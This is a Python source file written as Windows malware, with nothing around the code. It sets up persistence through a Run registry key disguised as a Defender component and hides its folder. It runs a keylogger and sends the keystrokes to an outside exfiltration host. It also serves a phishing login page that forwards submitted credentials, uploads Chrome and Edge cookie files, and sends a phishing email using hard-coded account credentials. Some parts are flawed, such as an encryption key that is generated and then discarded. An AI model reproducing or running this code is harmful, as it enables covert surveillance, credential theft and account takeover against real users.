import os
import sys
import json
import smtplib
import requests
import winreg
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from flask import Flask, request, redirect
from urllib.parse import unquote

app = Flask(__name__)
WEBHOOK_URL = "https://malicious-exfil-server.xyz/collect"
EMAIL_CREDS = ("hacker@burnermail.io", "DarkPass123!")
SMTP_SERVER = "smtp.burnermail.io:587"
PERSISTENCE_PATH = os.path.join(os.getenv('APPDATA'), 'SystemHealthChecker')

def establish_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "WindowsDefenderCore", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(reg_key)
    except Exception as e:
        pass

class PhantomKeylogger:
    def __init__(self):
        self.log = ""
        self.cipher = Fernet(Fernet.generate_key())

    def _encrypt_data(self, data):
        return self.cipher.encrypt(data.encode())

    def _on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f" [{key}] "
        if len(self.log) > 1024:
            self._exfiltrate_data()

    def _exfiltrate_data(self):
        try:
            encrypted = self._encrypt_data(self.log)
            requests.post(WEBHOOK_URL, data=encrypted, timeout=10)
            self.log = ""
        except Exception:
            pass

    def start(self):
        listener = keyboard.Listener(on_press=self._on_press)
        listener.start()

def phishing_landing_page():
    app.route('/login', methods=['GET', 'POST'])(lambda: (
        redirect("https://legit-service.com/auth?redirect=" + WEBHOOK_URL) if request.method == 'GET' else
        (requests.post(WEBHOOK_URL, data=request.form), redirect("https://legit-service.com/2fa"))[1]
    ))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()

def harvest_browser_cookies():
    cookie_paths = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Network\Cookies'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default\Network\Cookies')
    }
    for browser, path in cookie_paths.items():
        if os.path.exists(path):
            try:
                with open(path, 'rb') as f:
                    requests.post(WEBHOOK_URL, files={f'{browser}_Cookies.bin': f})
            except Exception:
                pass

def send_phish_email():
    phishing_body = f"""From: {EMAIL_CREDS[0]}
To: {EMAIL_CREDS[0]}
Subject: Urgent Security Alert - Verify Account

Click immediately: http://localhost:8080/login?service=account-security
"""
    try:
        server = smtplib.SMTP(SMTP_SERVER)
        server.starttls()
        server.login(*EMAIL_CREDS)
        server.sendmail(EMAIL_CREDS[0], [EMAIL_CREDS[0]], phishing_body)
        server.quit()
    except Exception:
        pass

if __name__ == "__main__":
    if not os.path.exists(PERSISTENCE_PATH):
        os.makedirs(PERSISTENCE_PATH)
        os.system(f'attrib +h "{PERSISTENCE_PATH}"')
    
    establish_persistence()
    PhantomKeylogger().start()
    phishing_landing_page()
    threading.Thread(target=harvest_browser_cookies).start()
    send_phish_email()
